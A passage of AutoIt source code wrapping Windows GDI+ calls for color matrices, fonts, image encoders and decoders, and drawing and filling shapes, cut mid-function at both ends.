	DllStructSetData($tcm, "m", $fsatcomp * $gdip_blum, 11)
	DllStructSetData($tcm, "m", $fsatcomp * $gdip_blum, 12)
	DllStructSetData($tcm, "m", $fsatcomp * $gdip_blum + $fsat, 13)
	DllStructSetData($tcm, "m", 1, 19)
	DllStructSetData($tcm, "m", 1, 25)
	Return $tcm
EndFunc

Func _gdiplus_colormatrixcreatescale($fred, $fgreen, $fblue, $falpha = 1)
	Local $tcm
	$tcm = DllStructCreate($taggdipcolormatrix)
	DllStructSetData($tcm, "m", $fred, 1)
	DllStructSetData($tcm, "m", $fgreen, 7)
	DllStructSetData($tcm, "m", $fblue, 13)
	DllStructSetData($tcm, "m", $falpha, 19)
	DllStructSetData($tcm, "m", 1, 25)
	Return $tcm
EndFunc

Func _gdiplus_colormatrixcreatetranslate($fred, $fgreen, $fblue, $falpha = 0)
	Local $ii, $tcm, $afactors[4] = [$fred, $fgreen, $fblue, $falpha]
	$tcm = _gdiplus_colormatrixcreate()
	For $ii = 0 To 3
		DllStructSetData($tcm, "m", $afactors[$ii], 21 + $ii)
	Next
	Return $tcm
EndFunc

Func _gdiplus_customlinecapclone($hcustomlinecap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCloneCustomLineCap", "handle", $hcustomlinecap, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_customlinecapcreate($hpathfill, $hpathstroke, $ilinecap = 0, $nbaseinset = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateCustomLineCap", "handle", $hpathfill, "handle", $hpathstroke, "int", $ilinecap, "float", $nbaseinset, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[5]
EndFunc

Func _gdiplus_customlinecapdispose($hcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteCustomLineCap", "handle", $hcap)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_customlinecapgetstrokecaps($hcustomlinecap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetCustomLineCapStrokeCaps", "hwnd", $hcustomlinecap, "ptr*", 0, "ptr*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then SetError(10, $aresult[0], 0)
	Local $acaps[2]
	$acaps[0] = $aresult[2]
	$acaps[1] = $aresult[3]
	Return $acaps
EndFunc

Func _gdiplus_customlinecapsetstrokecaps($hcustomlinecap, $istartcap, $iendcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetCustomLineCapStrokeCaps", "handle", $hcustomlinecap, "int", $istartcap, "int", $iendcap)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_decoders()
	Local $icount = _gdiplus_decodersgetcount()
	Local $isize = _gdiplus_decodersgetsize()
	Local $tbuffer = DllStructCreate("byte[" & $isize & "]")
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageDecoders", "uint", $icount, "uint", $isize, "struct*", $tbuffer)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Local $pbuffer = DllStructGetPtr($tbuffer)
	Local $tcodec, $ainfo[$icount + 1][14]
	$ainfo[0][0] = $icount
	For $ii = 1 To $icount
		$tcodec = DllStructCreate($taggdipimagecodecinfo, $pbuffer)
		$ainfo[$ii][1] = _winapi_stringfromguid(DllStructGetPtr($tcodec, "CLSID"))
		$ainfo[$ii][2] = _winapi_stringfromguid(DllStructGetPtr($tcodec, "FormatID"))
		$ainfo[$ii][3] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "CodecName"))
		$ainfo[$ii][4] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "DllName"))
		$ainfo[$ii][5] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "FormatDesc"))
		$ainfo[$ii][6] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "FileExt"))
		$ainfo[$ii][7] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "MimeType"))
		$ainfo[$ii][8] = DllStructGetData($tcodec, "Flags")
		$ainfo[$ii][9] = DllStructGetData($tcodec, "Version")
		$ainfo[$ii][10] = DllStructGetData($tcodec, "SigCount")
		$ainfo[$ii][11] = DllStructGetData($tcodec, "SigSize")
		$ainfo[$ii][12] = DllStructGetData($tcodec, "SigPattern")
		$ainfo[$ii][13] = DllStructGetData($tcodec, "SigMask")
		$pbuffer += DllStructGetSize($tcodec)
	Next
	Return $ainfo
EndFunc

Func _gdiplus_decodersgetcount()
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageDecodersSize", "uint*", 0, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[1]
EndFunc

Func _gdiplus_decodersgetsize()
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageDecodersSize", "uint*", 0, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_drawimagepoints($hgraphic, $himage, $nulx, $nuly, $nurx, $nury, $nllx, $nlly, $icount = 3)
	Local $tpoint = DllStructCreate("float X;float Y;float X2;float Y2;float X3;float Y3")
	DllStructSetData($tpoint, "X", $nulx)
	DllStructSetData($tpoint, "Y", $nuly)
	DllStructSetData($tpoint, "X2", $nurx)
	DllStructSetData($tpoint, "Y2", $nury)
	DllStructSetData($tpoint, "X3", $nllx)
	DllStructSetData($tpoint, "Y3", $nlly)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawImagePoints", "handle", $hgraphic, "handle", $himage, "struct*", $tpoint, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_encoders()
	Local $icount = _gdiplus_encodersgetcount()
	Local $isize = _gdiplus_encodersgetsize()
	Local $tbuffer = DllStructCreate("byte[" & $isize & "]")
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageEncoders", "uint", $icount, "uint", $isize, "struct*", $tbuffer)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Local $pbuffer = DllStructGetPtr($tbuffer)
	Local $tcodec, $ainfo[$icount + 1][14]
	$ainfo[0][0] = $icount
	For $ii = 1 To $icount
		$tcodec = DllStructCreate($taggdipimagecodecinfo, $pbuffer)
		$ainfo[$ii][1] = _winapi_stringfromguid(DllStructGetPtr($tcodec, "CLSID"))
		$ainfo[$ii][2] = _winapi_stringfromguid(DllStructGetPtr($tcodec, "FormatID"))
		$ainfo[$ii][3] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "CodecName"))
		$ainfo[$ii][4] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "DllName"))
		$ainfo[$ii][5] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "FormatDesc"))
		$ainfo[$ii][6] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "FileExt"))
		$ainfo[$ii][7] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "MimeType"))
		$ainfo[$ii][8] = DllStructGetData($tcodec, "Flags")
		$ainfo[$ii][9] = DllStructGetData($tcodec, "Version")
		$ainfo[$ii][10] = DllStructGetData($tcodec, "SigCount")
		$ainfo[$ii][11] = DllStructGetData($tcodec, "SigSize")
		$ainfo[$ii][12] = DllStructGetData($tcodec, "SigPattern")
		$ainfo[$ii][13] = DllStructGetData($tcodec, "SigMask")
		$pbuffer += DllStructGetSize($tcodec)
	Next
	Return $ainfo
EndFunc

Func _gdiplus_encodersgetclsid($sfileextension)
	Local $aencoders = _gdiplus_encoders()
	If @error Then Return SetError(@error, 0, "")
	For $ii = 1 To $aencoders[0][0]
		If StringInStr($aencoders[$ii][6], "*." & $sfileextension) > 0 Then Return $aencoders[$ii][1]
	Next
	Return SetError(-1, -1, "")
EndFunc

Func _gdiplus_encodersgetcount()
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageEncodersSize", "uint*", 0, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[1]
EndFunc

Func _gdiplus_encodersgetparamlist($himage, $sencoder)
	Local $isize = _gdiplus_encodersgetparamlistsize($himage, $sencoder)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Local $tguid = _winapi_guidfromstring($sencoder)
	Local $iremainingsize = $isize - 4 - _gdiplus_paramsize()
	Local $tbuffer
	If $iremainingsize Then
		$tbuffer = DllStructCreate("dword Count;" & $taggdipencoderparam & ";byte [" & $iremainingsize & "]")
	Else
		$tbuffer = DllStructCreate("dword Count;" & $taggdipencoderparam)
	EndIf
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetEncoderParameterList", "handle", $himage, "struct*", $tguid, "uint", $isize, "struct*", $tbuffer)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $tbuffer
EndFunc

Func _gdiplus_encodersgetparamlistsize($himage, $sencoder)
	Local $tguid = _winapi_guidfromstring($sencoder)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetEncoderParameterListSize", "handle", $himage, "struct*", $tguid, "uint*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_encodersgetsize()
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageEncodersSize", "uint*", 0, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_fontcreate($hfamily, $fsize, $istyle = 0, $iunit = 3)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateFont", "handle", $hfamily, "float", $fsize, "int", $istyle, "int", $iunit, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[5]
EndFunc

Func _gdiplus_fontdispose($hfont)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteFont", "handle", $hfont)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_fontfamilycreate($sfamily, $pcollection = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateFontFamilyFromName", "wstr", $sfamily, "ptr", $pcollection, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_fontfamilycreatefromcollection($sfontname, $hfontcollection)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateFontFamilyFromName", "wstr", $sfontname, "ptr", $hfontcollection, "ptr*", 0)
	If @error Then Return SetError(@error, @extended, "")
	If $aresult[0] Then Return SetError(10, $aresult[0], "")
	Return $aresult[3]
EndFunc

Func _gdiplus_fontfamilydispose($hfamily)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteFontFamily", "handle", $hfamily)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_fontfamilygetcellascent($hfontfamily, $istyle = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetCellAscent", "handle", $hfontfamily, "int", $istyle, "ushort*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_fontfamilygetcelldescent($hfontfamily, $istyle = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetCellDescent", "handle", $hfontfamily, "int", $istyle, "ushort*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_fontfamilygetemheight($hfontfamily, $istyle = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetEmHeight", "handle", $hfontfamily, "int", $istyle, "ushort*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_fontfamilygetlinespacing($hfontfamily, $istyle = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetLineSpacing", "handle", $hfontfamily, "int", $istyle, "ushort*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_fontgetheight($hfont, $hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetFontHeight", "handle", $hfont, "handle", $hgraphics, "float*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_fontprivateaddfont($hfontcollection, $sfontfile)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipPrivateAddFontFile", "ptr", $hfontcollection, "wstr", $sfontfile)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_fontprivateaddmemoryfont($hfontcollection, $tfont)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipPrivateAddMemoryFont", "handle", $hfontcollection, "struct*", $tfont, "int", DllStructGetSize($tfont))
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_fontprivatecollectiondispose($hfontcollection)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeletePrivateFontCollection", "handle*", $hfontcollection)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_fontprivatecreatecollection()
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipNewPrivateFontCollection", "ptr*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[1]
EndFunc

Func _gdiplus_graphicsclear($hgraphics, $iargb = -16777216)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGraphicsClear", "handle", $hgraphics, "dword", $iargb)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicscreatefromhdc($hdc)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateFromHDC", "handle", $hdc, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_graphicscreatefromhwnd($hwnd)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateFromHWND", "hwnd", $hwnd, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_graphicsdispose($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteGraphics", "handle", $hgraphics)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawarc($hgraphics, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle, $hpen = 0)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawArc", "handle", $hgraphics, "handle", $hpen, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawbezier($hgraphics, $nx1, $ny1, $nx2, $ny2, $nx3, $ny3, $nx4, $ny4, $hpen = 0)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawBezier", "handle", $hgraphics, "handle", $hpen, "float", $nx1, "float", $ny1, "float", $nx2, "float", $ny2, "float", $nx3, "float", $ny3, "float", $nx4, "float", $ny4)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawclosedcurve($hgraphics, $apoints, $hpen = 0)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawClosedCurve", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawclosedcurve2($hgraphics, $apoints, $ntension, $hpen = 0)
	Local $ii, $icount, $tpoints, $aresult
	__gdiplus_pendefcreate($hpen)
	$icount = $apoints[0][0]
	$tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	$aresult = DllCall($__g_hgdipdll, "int", "GdipDrawClosedCurve2", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount, "float", $ntension)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawcurve($hgraphics, $apoints, $hpen = 0)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawCurve", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawcurve2($hgraphics, $apoints, $ntension, $hpen = 0)
	Local $ii, $icount, $tpoints, $aresult
	__gdiplus_pendefcreate($hpen)
	$icount = $apoints[0][0]
	$tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	$aresult = DllCall($__g_hgdipdll, "int", "GdipDrawCurve2", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount, "float", $ntension)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawellipse($hgraphics, $nx, $ny, $nwidth, $nheight, $hpen = 0)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawEllipse", "handle", $hgraphics, "handle", $hpen, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawimage($hgraphics, $himage, $nx, $ny)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawImage", "handle", $hgraphics, "handle", $himage, "float", $nx, "float", $ny)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawimagepointsrect($hgraphics, $himage, $nulx, $nuly, $nurx, $nury, $nllx, $nlly, $nsrcx, $nsrcy, $nsrcwidth, $nsrcheight, $himageattributes = 0, $iunit = 2)
	Local $tpoints = DllStructCreate("float X; float Y; float X2; float Y2; float X3; float Y3;")
	DllStructSetData($tpoints, "X", $nulx)
	DllStructSetData($tpoints, "Y", $nuly)
	DllStructSetData($tpoints, "X2", $nurx)
	DllStructSetData($tpoints, "Y2", $nury)
	DllStructSetData($tpoints, "X3", $nllx)
	DllStructSetData($tpoints, "Y3", $nlly)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawImagePointsRect", "handle", $hgraphics, "handle", $himage, "struct*", $tpoints, "int", 3, "float", $nsrcx, "float", $nsrcy, "float", $nsrcwidth, "float", $nsrcheight, "int", $iunit, "handle", $himageattributes, "ptr", 0, "ptr", 0)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawimagerect($hgraphics, $himage, $nx, $ny, $nw, $nh)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawImageRect", "handle", $hgraphics, "handle", $himage, "float", $nx, "float", $ny, "float", $nw, "float", $nh)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawimagerectrect($hgraphics, $himage, $nsrcx, $nsrcy, $nsrcwidth, $nsrcheight, $ndstx, $ndsty, $ndstwidth, $ndstheight, $pattributes = 0, $iunit = 2)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawImageRectRect", "handle", $hgraphics, "handle", $himage, "float", $ndstx, "float", $ndsty, "float", $ndstwidth, "float", $ndstheight, "float", $nsrcx, "float", $nsrcy, "float", $nsrcwidth, "float", $nsrcheight, "int", $iunit, "handle", $pattributes, "ptr", 0, "ptr", 0)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawline($hgraphics, $nx1, $ny1, $nx2, $ny2, $hpen = 0)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawLine", "handle", $hgraphics, "handle", $hpen, "float", $nx1, "float", $ny1, "float", $nx2, "float", $ny2)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawpath($hgraphics, $hpath, $hpen = 0)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawPath", "handle", $hgraphics, "handle", $hpen, "handle", $hpath)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawpie($hgraphics, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle, $hpen = 0)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawPie", "handle", $hgraphics, "handle", $hpen, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawpolygon($hgraphics, $apoints, $hpen = 0)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawPolygon", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawrect($hgraphics, $nx, $ny, $nwidth, $nheight, $hpen = 0)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawRectangle", "handle", $hgraphics, "handle", $hpen, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsdrawstring($hgraphics, $sstring, $nx, $ny, $sfont = "Arial", $fsize = 10, $iformat = 0)
	Local $hbrush = _gdiplus_brushcreatesolid()
	Local $hformat = _gdiplus_stringformatcreate($iformat)
	Local $hfamily = _gdiplus_fontfamilycreate($sfont)
	Local $hfont = _gdiplus_fontcreate($hfamily, $fsize)
	Local $tlayout = _gdiplus_rectfcreate($nx, $ny, 0, 0)
	Local $ainfo = _gdiplus_graphicsmeasurestring($hgraphics, $sstring, $hfont, $tlayout, $hformat)
	If @error Then Return SetError(@error, @extended, 0)
	Local $aresult = _gdiplus_graphicsdrawstringex($hgraphics, $sstring, $hfont, $ainfo[0], $hformat, $hbrush)
	Local $ierror = @error, $iextended = @extended
	_gdiplus_fontdispose($hfont)
	_gdiplus_fontfamilydispose($hfamily)
	_gdiplus_stringformatdispose($hformat)
	_gdiplus_brushdispose($hbrush)
	Return SetError($ierror, $iextended, $aresult)
EndFunc

Func _gdiplus_graphicsdrawstringex($hgraphics, $sstring, $hfont, $tlayout, $hformat, $hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawString", "handle", $hgraphics, "wstr", $sstring, "int", -1, "handle", $hfont, "struct*", $tlayout, "handle", $hformat, "handle", $hbrush)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsfillclosedcurve($hgraphics, $apoints, $hbrush = 0)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	__gdiplus_brushdefcreate($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipFillClosedCurve", "handle", $hgraphics, "handle", $hbrush, "struct*", $tpoints, "int", $icount)
	__gdiplus_brushdefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsfillclosedcurve2($hgraphics, $apoints, $ntension, $hbrush = 0, $ifillmode = 0)
	Local $ii, $icount, $tpoints, $aresult
	__gdiplus_brushdefcreate($hbrush)
	$icount = $apoints[0][0]
	$tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	$aresult = DllCall($__g_hgdipdll, "int", "GdipFillClosedCurve2", "handle", $hgraphics, "handle", $hbrush, "struct*", $tpoints, "int", $icount, "float", $ntension, "int", $ifillmode)
	__gdiplus_brushdefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsfillellipse($hgraphics, $nx, $ny, $nwidth, $nheight, $hbrush = 0)
	__gdiplus_brushdefcreate($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipFillEllipse", "handle", $hgraphics, "handle", $hbrush, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
	__gdiplus_brushdefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsfillpath($hgraphics, $hpath, $hbrush = 0)
	__gdiplus_brushdefcreate($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipFillPath", "handle", $hgraphics, "handle", $hbrush, "handle", $hpath)
	__gdiplus_brushdefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsfillpie($hgraphics, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle, $hbrush = 0)
	__gdiplus_brushdefcreate($hbrush)
